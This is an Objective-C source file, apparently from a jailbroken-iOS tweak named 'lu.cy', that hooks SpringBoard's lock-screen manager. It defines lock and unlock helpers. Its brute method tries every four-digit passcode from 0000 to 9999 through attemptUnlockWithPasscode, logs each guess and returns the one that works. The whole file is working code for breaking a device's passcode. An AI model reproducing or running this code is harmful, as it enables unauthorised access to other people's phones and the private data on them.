@interface LuCyPasscode : NSObject
+(id)sharedInstance;
-(BOOL)unlock:(NSString *)passcode;
-(BOOL)lock;
-(NSString *)brute;
@end

@interface SBLockScreenManager : NSObject
+(id)sharedInstance;
-(BOOL)attemptUnlockWithPasscode:(id)arg1;
- (BOOL)remoteLock:(_Bool)arg1;
@end

@implementation LuCyPasscode

+(id)sharedInstance {
	static id sharedInstance = nil;
	static dispatch_once_t token = 0;
	dispatch_once(&token, ^{
		sharedInstance = [self new];
	});
	return sharedInstance;
}

-(BOOL)unlock:(NSString *)passcode {
	return [[%c(SBLockScreenManager) sharedInstance] attemptUnlockWithPasscode:passcode];
}

-(BOOL)lock {
	[[%c(SBLockScreenManager) sharedInstance] remoteLock:0];
	return YES;
}

-(NSString *)brute {
	//if ([[UIApplication sharedApplication] isProtectedDataAvailable] == 1){
		NSLog(@"[lu.cy] Brute forcing passcode...");
		for(int i = 0; i <= 9999; i++) {
			NSString* numb = [@"000" stringByAppendingString:[NSString stringWithFormat:@"%d", i]];
			NSString* guess = [numb substringFromIndex:[numb length] - 4];
			BOOL status = [self unlock:guess];
			NSLog(@"[lu.cy] Guess: %@", guess);
			if(status){
				return guess;
			}
			[NSThread sleepForTimeInterval:1];
		}
		return @"Unable to brute force passcode";
	//}
	//return @"Device is currently unlocked";
}

-(NSString *)forcebrute {
	[self lock];
	[NSThread sleepForTimeInterval:1];
	return [self brute];
}

@end